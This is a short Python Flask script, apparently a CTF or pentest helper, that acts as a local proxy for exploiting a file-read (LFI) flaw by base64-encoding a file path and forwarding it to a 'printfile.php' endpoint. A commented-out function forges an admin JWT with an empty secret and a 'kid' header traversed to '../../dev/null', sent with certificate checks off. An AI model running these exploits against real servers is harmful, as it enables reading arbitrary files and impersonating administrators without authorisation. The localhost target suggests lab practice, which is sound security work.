import requests
from flask import Flask
from base64 import b64encode
from flask import request
import jwt

app = Flask(__name__)

@app.route("/")
def proxy(): #here for instance for LFI if GET parameter is encoded in base64)
    url = """http://localhost/printfile.php?filePath="""
    fichier = request.args.get('file')
    b64 = b64encode(fichier.encode())
    resp = requests.get(url+str(b64)[2:-1])
    content = resp.text
    print(content)
    return content
#def jwtproxy():
#    url = """https://localhost"""
#    c=request.args.get('cookie')
#    encoded_jwt = jwt.encode({"username":"admin","wallet":[c],"kid": "../../dev/null"}, "",algorithm="HS256",)#headers={"kid": "../../dev/null"})
#    before_send = str(encoded_jwt)[2:-1]
#    cookies = {'user': before_send}   
#    resp = requests.get(url,cookies=cookies,verify=False)
#    content = resp.content
#    print(before_send)
#    print(content)
#    return content


app.run("127.0.0.1", port=8888, debug=True)
